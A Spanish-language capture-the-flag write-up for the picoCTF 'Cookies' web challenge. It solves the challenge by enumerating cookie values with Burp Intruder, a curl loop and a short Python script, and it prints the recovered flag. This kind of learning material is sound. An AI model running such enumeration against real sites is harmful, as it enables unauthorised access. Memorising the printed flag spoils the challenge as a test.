
## Reto
Cookies

## Descripcion
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)

## Solucion
- al entrar a la pagina solo nos muestra una barra de texto que pregunta por galletas
- con cookie editos cambio el -1 guardado a 1, aunque si me da una respuesta no es la bandera y hay muchas posibles cookies
- Usando proxyfoxy y burpsuite cuando me da la respuesta, lo mando a intruder
- cambio donde dice: `Cookie: name=1` y borro el 1 y doy click donde dice add.
- en payload pongo de tipo numero, que va del 1 al 30; de 1 en 1, y empiezo el ataque
- una vez que me de los resultados busco en cada una las respuestas que me manda y en la 18 veo la bandera: **picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}**

### ALT
- des consola puedo poner esto para que me regrese la respuesta con una cookie: `curl http://mercury.picoctf.net:17781/check -H "Cookie: name=1`
- hago un ciclo para que me de todas las respuestas dentro del ciclo pero lo filtro con grep para que solo me regrese alguna que contenga "pico"
- for i in {1..30}; do curl -s http://mercury.picoctf.net:17781/check -H "Cookie: name=$i"; done | grep pico  `
            `<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}</code></p>`

### ALT 2

- Usando un script de python para hacer lo mismo que en ALT 1:

import requests # libreria para realizar peticiones
import re # libreria para expresiones regulares

url = "http://mercury.picoctf.net:17781/check"
for i in range(20):
        cookie = {'name':'{}'.format(i)} # crea la cookie
        r = requests.get(url, cookies=cookie) # hace la peticion con la cookie modificada
        if 'pico' in r.text:
                flag = re.findall('picoCTF{.*?}',r.text)[0] # substrae la bandera de la respuesta
                print(flag)
## Notas
- un proxie es un intermedio entre el navegador y el servidor
## Referencias

